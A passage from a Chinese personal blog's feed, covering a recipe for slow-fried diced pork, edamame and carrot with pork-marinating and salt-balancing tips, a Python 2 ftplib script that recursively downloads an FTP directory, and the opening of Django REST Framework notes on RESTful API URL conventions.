<p>接下来的几篇会分享一些基于这种方法改良原有菜谱或者“创造”新菜谱的经验。</p>
<p>祝君烧得一手好菜~</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Cooking</tag>
        <tag>Dog2&#39;s Cooking Notes</tag>
        <tag>Foodie</tag>
      </tags>
  </entry>
  <entry>
    <title>二厨笔记 #2: 慢炒三丁「菜谱」</title>
    <url>/life/dog2s-cooking-notes-2/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Dog2's Cooking Notes #2: Slowly Fried DingDingDing(Cookbook)</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h2 id="前言">前言</h2>
<p>本菜谱是根据<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9y">「下厨房」<i class="fa fa-external-link-alt"></i></span>菜谱<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9yZWNpcGUvMTAwMjg3NTY2Lw==">「毛豆肉丁炒茄子」<i class="fa fa-external-link-alt"></i></span> 改进而来。</p>
<p>改进后的菜谱在食材中去掉了茄丁，用胡萝卜丁替换，因茄丁按照原菜谱的处理方式仍比较吸盐，且原菜谱中处理茄丁不像烹制肉末茄子那样会使用过量油煎透，这会导致最终烹制的茄丁带有些许生茄特有的腥味。</p>
<p>后续佐料以及烹制方法也有较大改动，具体见新菜谱。</p>
<a id="more"></a>
<h2 id="腌制瘦肉丝丁末">腌制瘦肉(丝/丁/末)</h2>
<p>在介绍正式菜谱之前，本节先介绍一下通用的瘦肉腌制方法。</p>
<p>不少经典菜谱都需要使用瘦肉，比如青椒肉丝、肉末茄子等，在炒制前对瘦肉进行腌制是一道必不可少的工序，腌制其实就是加入佐料拌匀静置片刻的简单过程，但不同菜谱中的腌制佐料不尽相同。因此这里介绍一下个人认为味道较好的腌制方式。</p>
<p>该方法正是从上节中的原菜谱中习得，也可运用到其他需腌制瘦肉的菜谱中，属于一种较好的通用姿势。</p>
<p><strong>腌制方法为：加入生抽、黄酒（料酒）、香油（芝麻油）、胡椒粉、淀粉（嫩肉粉），拌匀并静置10分钟以上。</strong></p>
<p>很多菜谱中介绍的腌制过程是需要加入盐的，但是经过一段时间实践我发现这是不需要且最好不要的，因为正如上一篇文章「食材吸盐度小结」中介绍，瘦肉属于较容易吸盐的食材，若腌制时加入盐，后续在炒制过程中还会再吸盐，最终可能导致炒出的菜唯独瘦肉过咸而导致整道菜的口感不平衡。</p>
<p>为了便于进一步体会，这里用青椒（木耳）肉丝的炒制过程作为示例：</p>
<ol type="1">
<li>腌制完的瘦肉过油后盛起备用。</li>
<li>少量油入锅，爆香葱姜蒜末。</li>
<li>青椒丝、木耳入锅，加入适量生抽、料酒、香油、糖以及三分之二的盐，炒至加入液体挥发殆尽。</li>
<li>瘦肉入锅，加入三分之一的盐及少量水，翻炒至水挥发殆尽后完成。</li>
</ol>
<p>如上过程有如下几点需要注意：</p>
<ul>
<li>这里说各种佐料加入适量而没有具体数量值，是由于适量的值确实需要通过不断实践积累经验才能体会到，也就是“凭感觉”=.=，有一定经验后还需根据当次烹制时食材的量来权衡佐料的量。</li>
<li>这里所说的盐的量，是假设炒至这道菜所需的盐的总量为1，则在炒至青椒和木耳时放入总量的三分之二，加入瘦肉后再放入剩下三分之一。至于实际需盐的量，仍需根据经验判断。</li>
<li>之所以先加入三分之二的盐，是由于青椒和木耳的吸盐度相近，且远不如瘦肉，因此为了平衡最终不同食材的咸度，需要先放入大部分的盐炒制片刻，使部分盐被青椒和木耳吸收，在瘦肉入锅时，再放入剩下的三分之一，就能保证最终不同食材的咸度相近。</li>
<li>在烹制绝大多数菜的时候，都可以加入适量的糖用于提鲜。</li>
<li>最后一次加水，是为了让佐料均匀附着。因为此时锅中较干，几乎无水分，加入的佐料会粘着在食材表面，导致其不均匀分布，而仅用锅铲卜楞（翻炒）几下有时也并不能达到理想效果，因此需用少量水溶解后翻炒，效果最佳。</li>
</ul>
<h2 id="菜谱">菜谱</h2>
<p>言归正传，介绍菜谱——慢炒三丁。</p>
<p>这道菜较为耗时，大概需要40分钟（准备食材约20分钟，烹制约20分钟）。</p>
<h3 id="用料">1. 用料</h3>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">用料</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">猪肉</td>
<td style="text-align: center;">肉切小丁腌制10分钟</td>
</tr>
<tr class="even">
<td style="text-align: center;">毛豆</td>
<td style="text-align: center;">去外皮和里皮，里皮一定要去，否则难入味</td>
</tr>
<tr class="odd">
<td style="text-align: center;">胡萝卜</td>
<td style="text-align: center;">切小丁</td>
</tr>
<tr class="even">
<td style="text-align: center;">葱</td>
<td style="text-align: center;">适量切末</td>
</tr>
<tr class="odd">
<td style="text-align: center;">姜</td>
<td style="text-align: center;">适量切片</td>
</tr>
<tr class="even">
<td style="text-align: center;">蒜</td>
<td style="text-align: center;">适量切末</td>
</tr>
<tr class="odd">
<td style="text-align: center;">王守义十三香</td>
<td style="text-align: center;">这道菜的香味主要靠它，绝不可少哦</td>
</tr>
<tr class="even">
<td style="text-align: center;">生抽 料酒 芝麻油 淀粉 胡椒粉 味精（鸡精）</td>
<td style="text-align: center;">适量</td>
</tr>
</tbody>
</table>
<p>至于食材具体用量，依然需要凭感觉<sup>-</sup>，可以参考下图：</p>
<img src="/life/dog2s-cooking-notes-2/1.jpg" class="" title="食材一览">
<h3 id="烹制过程">2. 烹制过程</h3>
<ol type="1">
<li>一定量食用油入锅烧热，肉丁入锅炒至变色盛起待用。</li>
<li>再入少量食用油，葱姜蒜入锅爆香。</li>
<li>毛豆胡萝卜入锅，加入适量生抽、料酒、芝麻油、糖、三分之二的盐以及十三香，十三香可以稍微多一点，炒至加入液体挥发殆尽。糖的多少因人而异，二厨比较喜欢整道菜有淡淡的甜味，因此加得多点。</li>
<li>胡萝卜和毛豆较难熟透，因此需加入大量冷水进行大火煮制，具体的量以稍多于完全淹没锅中食材的量为佳，可以观察上图，此次用量为盛放毛豆的塑料碗一满碗。</li>
<li>在煮制15分钟左右直至加入的水已蒸发大部分而接近收汁时，肉丁入锅，加入适量味精（鸡精）和三分之一的盐，炒至锅中完全收汁。此时再加入少量水（200-300毫升），再炒至完全收汁即可出锅。</li>
</ol>
<h2 id="后话">后话</h2>
<p>本文以平衡不同食材的咸度为中心，坚持慢工细活儿和跟感觉走的两个基本点，介绍了二厨通过乱改菜谱、肆意烹调而妄图成为社会主义好大厨的过程。</p>
<p>这道菜较为耗时，因此不适合工作日烹制，那什么菜能在短时间内完成，以适合日益增多的奔波族呢？下一篇就会搜集一些懒人菜谱，以方便上班族们在回家后能简单快捷地吃上自己亲手打造的黑暗料理~</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Cooking</tag>
        <tag>Dog2&#39;s Cooking Notes</tag>
        <tag>Foodie</tag>
        <tag>Cookbook</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现下载FTP服务器的整个目录（文件夹）</title>
    <url>/tech/downloading-ftp-directory-recursively-with-python/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Downloading FTP Directory Recursively with Python</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h3 id="需求">需求</h3>
<ul>
<li>快速批量下载多个FTP服务器的上的目录（指定目录或整个目录）。</li>
</ul>
<a id="more"></a>
<h3 id="分析">分析</h3>
<ul>
<li>核心问题：针对一个FTP Server，要能够下载其指定目录。即递归遍历所有目录，针对每个目录中的子目录，创建本地相应目录；针对每个目录中的文件，下载到本地相应目录。</li>
<li>下载所有文件的过程最好也是可并发的，以加快整个下载过程。</li>
</ul>
<h3 id="前车之轮">前车之轮</h3>
<p>需求及实现思路已经清楚，剩下的就是编码测试了。</p>
<p>按照惯例，为避免重复造轮子，在开工前有必要上谷歌百度一下，确定前人是否已经造出了好用的轮子。 找到如下几个：</p>
<ol type="1">
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzMzOTg2Lmh0bQ==">通过python下载FTP上的文件夹的实现代码<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL2Nhbmx5bmV0Lml0ZXllLmNvbS9ibG9nLzgzNjk5Ng==">python实现的ftp自动上传下载程序（支持目录递归操作）<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzY3MTk2Lmh0bQ==">python实现支持目录FTP上传下载文件的方法<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9mdHB1dGlsLzMuMg==">python第三方库 ftputil<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9weWZ0cHN5bmMvMS4wLjM=">python第三方库 pyftpsync<i class="fa fa-external-link-alt"></i></span></li>
</ol>
<p>逐一测试，都不太好用。</p>
<p>1在现实时使用os.chdir切换本地下载目录，批量下载（多线程并发下载多个服务器目录）时会产生目录混乱。</p>
<p>3在下载每个文件都需要执行ls函数确认其存在于远程目录，性能很低。</p>
<p>使用2 4 5没有成功下载过，可能是用法不对，粗略扫了下文档和源码，也没找到正确用法。如果你知道正确用法，还请指点。</p>
<h3 id="实现">实现</h3>
<p>既然前人的轮子都不太好用，只好再造一个。相对其他协议而言，FTP协议还是比较复杂的，因此最好基于已有的FTP库来实现，python的自带FTP库是ftplib，这里就选用它。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2Z0cGxpYi5odG1s">文档<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi9mdHBsaWIucHk=">源码<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>大概实现思路及流程已在0x01中指出，这里可能需要用到ftplib中的两个函数</p>
<ul>
<li><strong>ftplib.FTP.dir()</strong> : 用于列举目录信息，其内部实现调用的是FTP协议中的LIST请求，输出格式类似linux下的命令_<strong>ls -alh</strong>_。这里需要注意，默认情况下，该函数是不返回目录信息的字符串的，它在内部实现中调用了ftplib.FTP.retrlines()函数得到返回数据的每一行，并默认使用println函数处理每行数据，即打印至标准输出。当然，处理每行数据的函数是可以被替换的，在dir()函数的参数中指出即可。尽管如此还是难以将目录信息存入到一个字符串并返回，以供我们后续调用。在0x02中提到的3是通过是给dir函数传入自定义类的实例函数，并将目录信息存储在自定义类的实例变量中来得到这个值的。当然，也可以通过自定义函数结合全局变量的方式来得到这个值。这种实现略显蹩脚，因此在这里，我们参照原有dir函数的实现方式，在自定义类中实现一个新的dir函数，它不用再传入处理每行数据的函数，且能够返回目录信息。</li>
<li><strong>ftplib.FTP.retrbinary()</strong> : 用于指定并发送某种FTP请求，并以二进制数据接收响应。这里使用它来执行FTP协议中的RETR命令，以下载FTP服务器上指定路径的文件。</li>
</ul>
<h3 id="代码">代码</h3>
<p>实现代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ftplib</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FtpDownloader</span><span class="params">(object)</span>:</span></span><br><span class="line">    PATH_TYPE_UNKNOWN = <span class="number">-1</span></span><br><span class="line">    PATH_TYPE_FILE = <span class="number">0</span></span><br><span class="line">    PATH_TYPE_DIR = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, user=None, passwd=None, port=<span class="number">21</span>, timeout=<span class="number">10</span>)</span>:</span></span><br><span class="line">        self.conn = ftplib.FTP(</span><br><span class="line">            host=host,</span><br><span class="line">            user=user,</span><br><span class="line">            passwd=passwd,</span><br><span class="line">            timeout=timeout</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dir</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        by defualt, ftplib.FTP.dir() does not return any value.</span></span><br><span class="line"><span class="string">        Instead, it prints the dir info to the stdout.</span></span><br><span class="line"><span class="string">        So we re-implement it in FtpDownloader, which is able to return the dir info.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        info = []</span><br><span class="line">        cmd = <span class="string">'LIST'</span></span><br><span class="line">        <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">            <span class="keyword">if</span> arg:</span><br><span class="line">                cmd = cmd + (<span class="string">' '</span> + arg)</span><br><span class="line">        self.conn.retrlines(cmd, <span class="keyword">lambda</span> x: info.append(x.strip().split()))</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(self, rdir=None, init=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        recursively get the tree structure of a directory on FTP Server.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            rdir - remote direcotry path of the FTP Server.</span></span><br><span class="line"><span class="string">            init - flag showing whether in a recursion.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> init <span class="keyword">and</span> rdir <span class="keyword">in</span> (<span class="string">'.'</span>, <span class="literal">None</span>):</span><br><span class="line">            rdir = self.conn.pwd()</span><br><span class="line">        tree = []</span><br><span class="line">        tree.append((rdir, self.PATH_TYPE_DIR))</span><br><span class="line"></span><br><span class="line">        dir_info = self.dir(rdir)</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> dir_info:</span><br><span class="line">            attr = info[<span class="number">0</span>]  <span class="comment"># attribute</span></span><br><span class="line">            name = info[<span class="number">-1</span>]</span><br><span class="line">            path = os.path.join(rdir, name)</span><br><span class="line">            <span class="keyword">if</span> attr.startswith(<span class="string">'-'</span>):</span><br><span class="line">                tree.append((path, self.PATH_TYPE_FILE))</span><br><span class="line">            <span class="keyword">elif</span> attr.startswith(<span class="string">'d'</span>):</span><br><span class="line">                <span class="keyword">if</span> (name == <span class="string">'.'</span> <span class="keyword">or</span> name == <span class="string">'..'</span>):  <span class="comment"># skip . and ..</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tree.extend(self.tree(rdir=path,init=<span class="literal">False</span>))  <span class="comment"># recurse</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tree.append(path, self.PATH_TYPE_UNKNOWN)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> tree</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadFile</span><span class="params">(self, rfile, lfile)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a file with path %rfile on a FTP Server and save it to locate</span></span><br><span class="line"><span class="string">        path %lfile.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        ldir = os.path.dirname(lfile)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        f = open(lfile, <span class="string">'wb'</span>)</span><br><span class="line">        self.conn.retrbinary(<span class="string">'RETR %s'</span> % rfile, f.write)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">treeStat</span><span class="params">(self, tree)</span>:</span></span><br><span class="line">        numDir = <span class="number">0</span></span><br><span class="line">        numFile = <span class="number">0</span></span><br><span class="line">        numUnknown = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> path, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                numDir += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                numFile += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                numUnknown += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">downloadDir</span><span class="params">(self, rdir=<span class="string">'.'</span>, ldir=<span class="string">'.'</span>, tree=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                    errHandleFunc=None, verbose=True)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        download a direcotry with path %rdir on a FTP Server and save it to</span></span><br><span class="line"><span class="string">        locate path %ldir.</span></span><br><span class="line"><span class="string">        args:</span></span><br><span class="line"><span class="string">            tree - the tree structure return by function FtpDownloader.tree()</span></span><br><span class="line"><span class="string">            errHandleFunc - error handling function when error happens in</span></span><br><span class="line"><span class="string">                downloading one file, such as a function that writes a log.</span></span><br><span class="line"><span class="string">                By default, the error is print to the stdout.</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tree:</span><br><span class="line">            tree = self.tree(rdir=rdir, init=<span class="literal">True</span>)</span><br><span class="line">        numDir, numFile, numUnknown = self.treeStat(tree)</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s tree statistic:'</span> % self.conn.host</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d files, %d unknown type'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(ldir):</span><br><span class="line">            os.makedirs(ldir)</span><br><span class="line">        ldir = os.path.abspath(ldir)</span><br><span class="line"></span><br><span class="line">        numDownOk = <span class="number">0</span></span><br><span class="line">        numDownErr = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rpath, pathType <span class="keyword">in</span> tree:</span><br><span class="line">            lpath = os.path.join(ldir, rpath.strip(<span class="string">'/'</span>).strip(<span class="string">'\\'</span>))</span><br><span class="line">            <span class="keyword">if</span> pathType == self.PATH_TYPE_DIR:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(lpath):</span><br><span class="line">                    os.makedirs(lpath)</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_FILE:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.downloadFile(rpath, lpath)</span><br><span class="line">                    numDownOk += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                    numDownErr += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> errHandleFunc:</span><br><span class="line">                        errHandleFunc(err, rpath, lpath)</span><br><span class="line">                    <span class="keyword">elif</span> verbose:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'An Error occurred when downloading '</span>\</span><br><span class="line">                              <span class="string">'remote file %s'</span> % rpath</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                        <span class="keyword">print</span></span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Host %s: %d/%d/%d(ok/err/total) files downloaded'</span> % (</span><br><span class="line">                        self.conn.host,</span><br><span class="line">                        numDownOk,</span><br><span class="line">                        numDownErr,</span><br><span class="line">                        numFile</span><br><span class="line">                    )</span><br><span class="line">            <span class="keyword">elif</span> pathType == self.PATH_TYPE_UNKNOWN:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'Unknown type romote path got: %s'</span> % rpath</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Host %s directory %s download finished:'</span> % (</span><br><span class="line">                self.conn.host, rdir</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'%d directories, %d(%d failed) files, %d unknown type.'</span> % (</span><br><span class="line">                numDir,</span><br><span class="line">                numFile,</span><br><span class="line">                numDownErr,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown, numDownErr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="keyword">as</span> pr</span><br><span class="line"></span><br><span class="line">    flog = open(<span class="string">'err.log'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(host)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fd = FtpDownloader(</span><br><span class="line">                host=host,</span><br><span class="line">                user=<span class="string">'test'</span>,</span><br><span class="line">                passwd=<span class="string">'test'</span>,</span><br><span class="line">                port=<span class="number">21</span>,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            numDir, numFile, numUnknown, numDownErr = fd.downloadDir(</span><br><span class="line">                rdir=<span class="string">'.'</span>,</span><br><span class="line">                ldir=<span class="string">'download'</span>,</span><br><span class="line">                tree=<span class="literal">None</span>,</span><br><span class="line">                errHandleFunc=<span class="literal">None</span>,</span><br><span class="line">                verbose=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nok\n'</span></span><br><span class="line">                <span class="string">'%d directories, %d(%d failed) files, %d unknown type\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    numDir,</span><br><span class="line">                    numFile,</span><br><span class="line">                    numDownErr,</span><br><span class="line">                    numUnknown</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nerror\n%s\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    traceback.format_exc()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pr(run(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    flog.close()</span><br></pre></td></tr></table></figure>
<p>也可移步至<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2Z0cGRvd24=">github<i class="fa fa-external-link-alt"></i></span>获取代码，欢迎完善。</p>
<p>这里仅抛砖引玉，实现了下载单个FTP的整个目录的核心功能，可以基于该代码继续实现并发下载多个FTP服务器上的指定文件夹的功能。</p>
<p>值得一提的是，这里针对单个FTP服务器上的多个文件下载还是串行的，如想要实现并发下载单个FTP服务器上的多个文件，则可以先通过tree函数得到FTP服务器的目录树，然后再并发下载相应的文件。但并发下载时若多个下载线程共用一个ftplib.FTP类的实例，并调用该实例的retrbinary函数进行下载，则不同线程之间可能会相互影响，具体可以参考ftplib的源码。</p>
<p>当然，要解决这个问题，可以为每个下载线程创建一个独有的ftplib.FTP类的实例，但这样就加大了FTP服务器处理的并发连接数，最大连接数及下载性能还是会受限于FTP服务器，存在不确定性。</p>
<p>我们将实现的程序与Filezilia进行了对比测试，发现它对多个文件的下载过程也是串行了，而最终下载文件的总数及速度二者相近。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（一）：RESTful API 初探</title>
    <url>/tech/drf-learning-notes-1-hello-restful-api/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (1): Hello RESTful API</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>前后端分离是大势所趋</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>
<h1 id="按">按</h1>
<p>最近在学习Django Rest Framework，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy90dXRvcmlhbC9xdWlja3N0YXJ0Lw==">官方教程<i class="fa fa-external-link-alt"></i></span>较短，看完感觉并没有学习到最佳实践，对DRF的了解还是不成体系。<span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcmVxdWVzdHMv">官方API文档<i class="fa fa-external-link-alt"></i></span>虽然详细一些，但内容多且零散更适合查阅，对于系统性学习来说还是差了一点。</p>
<p>于是找到了<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW5FNDExSjdoeA==">一套不错的DRF源码分析视频<i class="fa fa-external-link-alt"></i></span>来学习，并且在这里记下学习笔记。</p>
<p>参考了这两位同学的笔记，大部分是视频讲师在视频里做过的课堂笔记。</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ2N1aWNhbi9jYXRlZ29yeS8xNjA3ODIyLmh0bWw=">随笔分类 - Django REST framework笔记<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWFuZ2ppYW9zaG91L2NhdGVnb3J5LzE2NzUwMjEuaHRtbA==">随笔分类 - Django--drf相关<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>根据我个人理解对笔记做了部分修改、整理和补充。这里有我的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZg==">测试代码<i class="fa fa-external-link-alt"></i></span>可供参考，包括django项目、db数据和postman的测试数据包。</p>
<h1 id="基本概念">基本概念</h1>
<ul>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU4JUExJUE4JUU3JThFJUIwJUU1JUIxJTgyJUU3JThBJUI2JUU2JTgwJTgxJUU4JUJEJUFDJUU2JThEJUEy">RESTful<i class="fa fa-external-link-alt"></i></span></strong>: Representational State Transfer 表现层状态转换</li>
<li><strong>ful</strong>: 形容词后缀，表示“（这一）类的、（这种）风格的”</li>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3poLWNuLyVFNSVCQSU5NCVFNyU5NCVBOCVFNyVBOCU4QiVFNSVCQSU4RiVFNiU4RSVBNSVFNSU4RiVBMw==">API<i class="fa fa-external-link-alt"></i></span></strong>: Application Programming Interface 应用程序接口</li>
<li><strong>接口</strong>：联系两个物质的媒介，完成信息交互</li>
<li><strong>Web程序接口</strong>
<ul>
<li>功能：联系前台页面与后台数据库的媒介</li>
<li>组成
<ul>
<li>url: 长得像返回数据的url链接</li>
<li>请求参数: 前台按照指定的key提供数据给后台</li>
<li>响应数据: 后台与数据库交互后将数据反馈给前台</li>
</ul></li>
</ul></li>
</ul>
<a id="more"></a>
<h1 id="restful-api">RESTful API</h1>
<h2 id="接口规范">接口规范</h2>
<ul>
<li>功能：为了采用不同的后台语言，也能使用同样的接口，获取到同样的数据</li>
<li>接口：
<ul>
<li>url</li>
<li>相应数据</li>
</ul></li>
<li>接口文档：
<ul>
<li>url + 请求参数</li>
<li>响应数据</li>
</ul></li>
</ul>
<h2 id="url规范">URL规范</h2>
<p>RESFful API的URL应包含如下部分：</p>
<h3 id="用api关键字标识接口url">用api关键字标识接口url</h3>
<p>如 - api.baidu.com - www.baidu.com/api</p>
<h3 id="优先选择https协议">优先选择https协议</h3>
<p>接口数据安全性考量</p>
<h3 id="版本标识">版本标识</h3>
<p>如</p>
<ul>
<li>api.baidu.com/v1/...</li>
<li>api.baidu.com/v2/...</li>
</ul>
<h3 id="资源">资源</h3>
<p>接口操作的数据对象，在url中一般采用资源（名词）复数形式。一个接口可以包含对该资源的多种操作方式。如</p>
<ul>
<li>api.baidu.com/books</li>
<li>api.baidu.com/books/(pk)</li>
</ul>
<h3 id="请求方法">请求方法</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRUUC9NZXRob2Rz">HTTP请求方法<i class="fa fa-external-link-alt"></i></span>，标识操作资源的方式，如</p>
<ul>
<li><code>GET /books/</code> &amp; <code>GET /books/(pk)</code>: 获取所有/获取一个</li>
<li><code>POST /books/</code>: 增加一个(多个)</li>
<li><code>DELETE /books/(pk)</code>: 删除一个</li>
<li><code>PUT /books/(pk)</code>: 整体更新一个</li>
<li><code>PATCH /books/(pk)</code>: 局部更新一个</li>
</ul>
<h3 id="请求参数">请求参数</h3>
